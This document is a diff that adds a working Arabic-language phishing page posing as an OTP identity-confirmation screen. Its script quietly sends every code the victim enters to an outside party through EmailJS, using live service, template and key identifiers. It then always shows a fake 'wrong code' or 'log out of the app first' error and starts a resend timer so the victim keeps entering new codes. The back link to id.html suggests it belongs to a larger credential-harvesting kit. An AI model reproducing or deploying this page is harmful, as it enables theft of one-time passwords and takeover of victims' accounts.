@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية</title>
+    <!-- استدعاء خط Cairo بأوزان متعددة لتطابق التصميم -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- الحفاظ على مكتبة وإعدادات EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("XKiDXTgX-UdwJ80LO");
+       })();
+    </script>
+
+    <style>
+        :root {
+            --primary-color: #123e6b; /* لون الزر والأيقونات الداكن */
+            --text-main: #1a1a1a;
+            --text-secondary: #6b7280;
+            --border-color: #d1d5db;
+            --bg-white: #ffffff;
+            --font-main: 'Cairo', sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background-color: #f3f4f6; /* خلفية خارجية رمادية للتباين */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .mobile-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            max-height: 850px;
+            position: relative;
+            background-color: var(--bg-white);
+            background-image: url('https://i.imgur.com/VacrlxB.png'); 
+            background-size: cover;
+            background-position: center;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            padding: 0 24px;
+        }
+
+        /* سهم الرجوع */
+        .header {
+            margin-top: 50px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: flex-start; /* لليمين بسبب RTL */
+            z-index: 2;
+        }
+
+        .back-btn {
+            color: var(--text-main);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn svg {
+            width: 24px;
+            height: 24px;
+            stroke: currentColor;
+            stroke-width: 2.5;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* العناوين */
+        .title-section {
+            margin-bottom: 35px;
+            z-index: 2;
+        }
+
+        .title-section h1 {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--text-main);
+            margin-bottom: 12px;
+        }
+
+        .title-section p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            font-weight: 600;
+        }
+
+        /* النموذج */
+        .form-section {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            z-index: 2;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            background-color: transparent;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-main);
+            padding: 16px 45px 16px 16px; /* مساحة للأيقونة اليمين */
+            font-family: var(--font-main);
+            font-size: 14px;
+            font-weight: 600;
+            outline: none;
+            transition: border-color 0.3s;
+            letter-spacing: 2px;
+        }
+
+        .input-group input::placeholder {
+            color: #9ca3af;
+            letter-spacing: normal;
+        }
+
+        .input-group input:focus {
+            border-color: var(--primary-color);
+        }
+
+        /* الأيقونات داخل الحقول */
+        .icon-right {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-main);
+        }
+
+        .icon-right svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* تنسيق رسالة الخطأ لتناسب الثيم الفاتح */
+        #error-message {
+            color: #ffffff;
+            background-color: #ef4444; /* أحمر يتناسب مع التصميم الحديث */
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+            font-family: var(--font-main);
+        }
+
+        /* تنسيق التايمر */
+        .resend-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--text-main);
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .resend-text {
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        #timer-text {
+            color: var(--primary-color);
+            font-weight: 800;
+        }
+
+        /* زر التأكيد */
+        .btn-primary {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: var(--bg-white);
+            padding: 16px;
+            border-radius: 8px;
+            border: none;
+            font-family: var(--font-main);
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn-primary:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+            opacity: 0.9;
+        }
+
+        /* الشروط والأحكام أسفل الشاشة */
+        .footer-terms {
+            margin-top: auto;
+            margin-bottom: 30px;
+            text-align: center;
+            z-index: 2;
+        }
+
+        .footer-terms p {
+            font-size: 12px;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .footer-terms a {
+            font-size: 13px;
+            color: var(--text-main);
+            font-weight: 800;
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        
+        <div class="header">
+            <!-- سهم الرجوع يوجه إلى id.html كما طلبت -->
+            <a href="id.html" class="back-btn">
+                <svg viewBox="0 0 24 24">
+                    <path d="M5 12h14M12 5l7 7-7 7" />
+                </svg>
+            </a>
+        </div>
+
+        <div class="title-section">
+            <h1>رمز التحقق</h1>
+            <p>الرجاء إدخال رمز التحقق (OTP) الذي تم إرساله إليك لتأكيد هويتك وإتمام العملية</p>
+        </div>
+
+        <form class="form-section" id="otp-form">
+            
+            <div class="input-group">
+                <div class="icon-right">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                </div>
+                <input type="text" id="otp" name="otp" placeholder="رمز التحقق" required autocomplete="one-time-code" inputmode="numeric">
+            </div>
+
+            <!-- رسالة الخطأ -->
+            <div id="error-message"></div>
+
+            <!-- التايمر وإعادة الإرسال -->
+            <div class="resend-container" id="resend-container" style="display: none;">
+                <span class="resend-text">اعادة ارسال رمز التحقق</span>
+                <span id="timer-text" dir="ltr"></span>
+            </div>
+
+            <button type="submit" class="btn-primary" id="submit-btn">تأكيد</button>
+
+        </form>
+
+        <!-- الشروط والأحكام أسفل الشاشة -->
+        <div class="footer-terms">
+            <p>بالاستمرار أنت توافق على كل من</p>
+            <a href="#">شروط الاستخدام و سياسة الخصوصية</a>
+        </div>
+    </div>
+
+    <!-- كود الجافاسكربت الخاص بك لعملية الإرسال والعداد (من ملف otp.html) -->
+    <script>
+        let attemptCount = 0; // تتبع عدد المحاولات
+
+        document.getElementById('otp-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const submitBtn = document.getElementById('submit-btn');
+            const errorMsg = document.getElementById('error-message');
+            const otpInput = document.getElementById('otp');
+
+            // زيادة عدد المحاولات في كل ضغطة
+            attemptCount++;
+
+            // إرسال البيانات في الخلفية عبر EmailJS في كل مرة
+            emailjs.sendForm('service_ifykx3f', 'template_adh5jnu', this)
+                .then(function() {
+                    console.log('تم إرسال الرمز بنجاح');
+                }, function(error) {
+                    console.log('حدث خطأ أثناء الإرسال', error);
+                });
+
+            // إظهار رسالة الخطأ المناسبة بناءً على رقم المحاولة
+            errorMsg.style.display = 'block';
+            if (attemptCount === 1) {
+                errorMsg.innerText = 'يرجى تسجيل الخروج من التطبيق اولًا';
+            } else {
+                errorMsg.innerText = 'رمز التحقق خطأ يرجى المحاولة مرة اخرى';
+            }
+
+            // تفريغ حقل الإدخال ليكون جاهزاً للمحاولة القادمة
+            otpInput.value = '';
+
+            // بدء التايمر لمدة 30 ثانية
+            let timeLeft = 30;
+            submitBtn.disabled = true; // تعطيل الزر لتجنب التكرار
+            
+            const resendContainer = document.getElementById('resend-container');
+            const timerText = document.getElementById('timer-text');
+            
+            resendContainer.style.display = 'flex'; // إظهار التايمر والنص
+            timerText.innerText = `00:${timeLeft}`;
+
+            const timerInterval = setInterval(function() {
+                timeLeft--;
+                let seconds = timeLeft < 10 ? `0${timeLeft}` : timeLeft;
+                timerText.innerText = `00:${seconds}`;
+
+                // عند انتهاء العداد
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    submitBtn.disabled = false; // إعادة تفعيل الزر
+                    resendContainer.style.display = 'none'; // إخفاء التايمر بعد الانتهاء
+                }
+            }, 1000); // يتكرر كل ثانية (1000 مللي ثانية)
+        });
+    </script>
+</body>
+</html>
